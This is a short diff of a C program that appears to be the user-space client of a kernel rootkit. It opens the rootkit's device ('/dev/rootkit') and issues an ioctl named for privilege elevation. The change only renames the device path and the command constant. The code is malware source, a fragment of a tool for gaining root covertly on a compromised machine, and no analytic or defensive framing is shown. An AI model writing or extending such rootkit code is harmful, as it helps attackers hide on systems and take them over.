@@ -8,14 +8,14 @@
 int main(void) {
 	int fd;
 
-	fd = open("/dev/rk", O_RDWR);
+	fd = open("/dev/rootkit", O_RDWR);
 
 	 if (fd == -1) {
         perror("open");
         return -1;
     }
 
-    if (ioctl(fd, RK_ELEVATE) == -1) {
+    if (ioctl(fd, rootkit_ELEVATE) == -1) {
         perror("ioctl");
         close(fd);
         return -1;
